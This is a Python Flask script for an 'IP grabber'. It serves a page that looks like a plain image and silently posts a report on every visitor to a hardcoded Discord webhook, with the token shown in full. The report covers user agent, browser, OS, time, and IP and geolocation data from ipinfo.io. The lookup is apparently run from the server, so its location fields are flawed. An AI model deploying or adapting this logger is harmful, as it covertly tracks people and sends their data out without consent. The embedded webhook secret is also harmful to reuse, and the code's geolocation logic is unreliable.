from flask import Flask, request, send_file
import requests
from datetime import datetime
import os

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1429771453334552628/R4uhx7WslGil8sKKzEI_oxDpa5jHe_lc7iXZSY0KnZpj8lkS-Z_3K__KX7GMnGRVQohm"

def get_ip_info():
    try:
        response = requests.get("https://ipinfo.io/json", timeout=10)
        data = response.json()
        coords = "Desconhecida"
        if data.get("loc"):
            lat, lon = data["loc"].split(",")
            coords = f"{lat}, {lon}"
        return {
            "ip": data.get("ip", "Desconhecido"),
            "city": data.get("city", "Desconhecida"),
            "region": data.get("region", "Desconhecida"),
            "country": data.get("country", "Desconhecido"),
            "coordinates": coords,
            "org": data.get("org", "Desconhecido"),
            "timezone": data.get("timezone", "Desconhecido"),
            "asn": data.get("org", "Desconhecido").split()[0] if data.get("org") else "Desconhecido"
        }
    except:
        return None

def detect_browser(user_agent):
    ua = user_agent.lower()
    if "chrome" in ua and "edg" not in ua:
        return "Google Chrome"
    elif "firefox" in ua:
        return "Mozilla Firefox"
    elif "safari" in ua and "chrome" not in ua:
        return "Apple Safari"
    elif "edg" in ua:
        return "Microsoft Edge"
    elif "opera" in ua:
        return "Opera"
    elif "brave" in ua:
        return "Brave"
    else:
        return "Unknown Browser"

def detect_os(user_agent):
    ua = user_agent.lower()
    if "windows" in ua:
        return "Windows"
    elif "mac" in ua:
        return "macOS"
    elif "linux" in ua:
        return "Linux"
    elif "android" in ua:
        return "Android"
    elif "iphone" in ua or "ipad" in ua:
        return "iOS"
    else:
        return "Unknown OS"

@app.route("/")
def index():
    user_agent = request.headers.get("User-Agent", "Desconhecido")
    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    
    ip_info = get_ip_info()
    browser = detect_browser(user_agent)
    os_name = detect_os(user_agent)
    is_bot = any(bot in user_agent.lower() for bot in ['bot', 'crawler', 'spider', 'vercel'])

    message = "**📱 NOVO ACESSO AO SITE**\n\n"
    message += "**🌐 IP Info:**\n"
    if ip_info:
        message += f"> **IP:** `{ip_info['ip']}`\n"
        message += f"> **Provider:** `{ip_info['org']}`\n"
        message += f"> **País:** `{ip_info['country']}`\n"
        message += f"> **Cidade:** `{ip_info['city']}`\n"
        message += f"> **Coordenadas:** `{ip_info['coordinates']}`\n"
        message += f"> **Bot:** `{is_bot}`\n\n"
    else:
        message += f"> **IP:** `Desconhecido`\n"
        message += f"> **Provider:** `Desconhecido`\n"
        message += f"> **País:** `Desconhecido`\n"
        message += f"> **Cidade:** `Desconhecido`\n"
        message += f"> **Coordenadas:** `Desconhecida`\n"
        message += f"> **Bot:** `{is_bot}`\n\n"
    
    message += "**💻 PC Info:**\n"
    message += f"> **Sistema:** `{os_name}`\n"
    message += f"> **Navegador:** `{browser}`\n\n"
    message += f"**🕒 Horário:** `{timestamp}`"

    try:
        requests.post(WEBHOOK_URL, json={"content": message}, timeout=5)
    except:
        pass

    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Image</title>
        <style>
            body {
                margin: 0;
                padding: 0;
                background: #000;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            img {
                max-width: 100%;
                max-height: 100%;
            }
        </style>
    </head>
    <body>
        <img src="/image.jpg" alt="Image">
    </body>
    </html>
    """

@app.route("/image.jpg")
def image():
    # Coloque sua imagem na mesma pasta com nome image.jpg
    return send_file("image.jpg")

if __name__ == "__main__":
    app.run()
